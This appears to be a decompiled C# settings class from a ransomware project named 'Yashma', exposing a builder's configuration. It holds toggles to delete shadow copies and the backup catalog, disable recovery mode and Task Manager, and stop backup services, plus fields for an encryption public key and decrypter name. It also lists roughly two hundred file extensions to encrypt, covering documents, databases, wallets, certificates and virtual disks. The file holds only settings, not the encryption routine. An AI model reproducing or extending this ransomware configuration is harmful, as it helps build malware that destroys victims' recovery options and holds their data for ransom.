using System.CodeDom.Compiler;
using System.Configuration;
using System.Diagnostics;
using System.Runtime.CompilerServices;

namespace Yashma_Ransomware.Properties;

[CompilerGenerated]
[GeneratedCode("Microsoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator", "17.11.0.0")]
internal sealed class Settings : ApplicationSettingsBase
{
	private static Settings defaultInstance = (Settings)(object)SettingsBase.Synchronized((SettingsBase)(object)new Settings());

	public static Settings Default => defaultInstance;

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("")]
	public string base64Image
	{
		get
		{
			return (string)((SettingsBase)this)["base64Image"];
		}
		set
		{
			((SettingsBase)this)["base64Image"] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("False")]
	public bool checkAdminPrivilage
	{
		get
		{
			return (bool)((SettingsBase)this)["checkAdminPrivilage"];
		}
		set
		{
			((SettingsBase)this)["checkAdminPrivilage"] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("")]
	public string decrypterName
	{
		get
		{
			return (string)((SettingsBase)this)["decrypterName"];
		}
		set
		{
			((SettingsBase)this)["decrypterName"] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("False")]
	public bool deleteBackupCatalog
	{
		get
		{
			return (bool)((SettingsBase)this)["deleteBackupCatalog"];
		}
		set
		{
			((SettingsBase)this)["deleteBackupCatalog"] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("False")]
	public bool deleteShadowCopies
	{
		get
		{
			return (bool)((SettingsBase)this)["deleteShadowCopies"];
		}
		set
		{
			((SettingsBase)this)["deleteShadowCopies"] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("False")]
	public bool disableRecoveryMode
	{
		get
		{
			return (bool)((SettingsBase)this)["disableRecoveryMode"];
		}
		set
		{
			((SettingsBase)this)["disableRecoveryMode"] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("False")]
	public bool disableTaskManager
	{
		get
		{
			return (bool)((SettingsBase)this)["disableTaskManager"];
		}
		set
		{
			((SettingsBase)this)["disableTaskManager"] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("True")]
	public bool encryptOption
	{
		get
		{
			return (bool)((SettingsBase)this)["encryptOption"];
		}
		set
		{
			((SettingsBase)this)["encryptOption"] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("\".txt\",\".jar\",\".dat\",\".contact\",\".settings\",\".doc\",\".docx\",\".xls\",\".xlsx\",\".ppt\",\".pptx\",\".odt\",\".jpg\",\".mka\",\".mhtml\",\".oqy\",\".png\",\".csv\",\".py\",\".sql\",\".mdb\",\".php\",\".asp\",\".aspx\",\".html\",\".htm\",\".xml\",\".psd\",\".pdf\",\".xla\",\".cub\",\".dae\",\".indd\",\".cs\",\".mp3\",\".mp4\",\".dwg\",\".zip\",\".rar\",\".mov\",\".rtf\",\".bmp\",\".mkv\",\".avi\",\".apk\",\".lnk\",\".dib\",\".dic\",\".dif\",\".divx\",\".iso\",\".7zip\",\".ace\",\".arj\",\".bz2\",\".cab\",\".gzip\",\".lzh\",\".tar\",\".jpeg\",\".xz\",\".mpeg\",\".torrent\",\".mpg\",\".core\",\".pdb\",\".ico\",\".pas\",\".db\",\".wmv\",\".swf\",\".cer\",\".bak\",\".backup\",\".accdb\",\".bay\",\".p7c\",\".exif\",\".vss\",\".raw\",\".m4a\",\".wma\",\".flv\",\".sie\",\".sum\",\".ibank\",\".wallet\",\".css\",\".js\",\".rb\",\".crt\",\".xlsm\",\".xlsb\",\".7z\",\".cpp\",\".java\",\".jpe\",\".ini\",\".blob\",\".wps\",\".docm\",\".wav\",\".3gp\",\".webm\",\".m4v\",\".amv\",\".m4p\",\".svg\",\".ods\",\".bk\",\".vdi\",\".vmdk\",\".onepkg\",\".accde\",\".jsp\",\".json\",\".gif\",\".log\",\".gz\",\".config\",\".vb\",\".m1v\",\".sln\",\".pst\",\".obj\",\".xlam\",\".djvu\",\".inc\",\".cvs\",\".dbf\",\".tbi\",\".wpd\",\".dot\",\".dotx\",\".xltx\",\".pptm\",\".potx\",\".potm\",\".pot\",\".xlw\",\".xps\",\".xsd\",\".xsf\",\".xsl\",\".kmz\",\".accdr\",\".stm\",\".accdt\",\".ppam\",\".pps\",\".ppsm\",\".1cd\",\".3ds\",\".3fr\",\".3g2\",\".accda\",\".accdc\",\".accdw\",\".adp\",\".ai\",\".ai3\",\".ai4\",\".ai5\",\".ai6\",\".ai7\",\".ai8\",\".arw\",\".ascx\",\".asm\",\".asmx\",\".avs\",\".bin\",\".cfm\",\".dbx\",\".dcm\",\".dcr\",\".pict\",\".rgbe\",\".dwt\",\".f4v\",\".exr\",\".kwm\",\".max\",\".mda\",\".mde\",\".mdf\",\".mdw\",\".mht\",\".mpv\",\".msg\",\".myi\",\".nef\",\".odc\",\".geo\",\".swift\",\".odm\",\".odp\",\".oft\",\".orf\",\".pfx\",\".p12\",\".pl\",\".pls\",\".safe\",\".tab\",\".vbs\",\".xlk\",\".xlm\",\".xlt\",\".xltm\",\".svgz\",\".slk\",\".tar.gz\",\".dmg\",\".ps\",\".psb\",\".tif\",\".rss\",\".key\",\".vob\",\".epsp\",\".dc3\",\".iff\",\".onepkg\",\".onetoc2\",\".opt\",\".p7b\",\".pam\",\".r3d\",\".ova\"")]
	public string extensions
	{
		get
		{
			return (string)((SettingsBase)this)["extensions"];
		}
		set
		{
			((SettingsBase)this)["extensions"] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("")]
	public string pathToBase64
	{
		get
		{
			return (string)((SettingsBase)this)["pathToBase64"];
		}
		set
		{
			((SettingsBase)this)["pathToBase64"] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("")]
	public string publicKey
	{
		get
		{
			return (string)((SettingsBase)this)["publicKey"];
		}
		set
		{
			((SettingsBase)this)["publicKey"] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("False")]
	public bool stopBackupServices
	{
		get
		{
			return (bool)((SettingsBase)this)["stopBackupServices"];
		}
		set
		{
			((SettingsBase)this)["stopBackupServices"] = value;
		}
	}
}
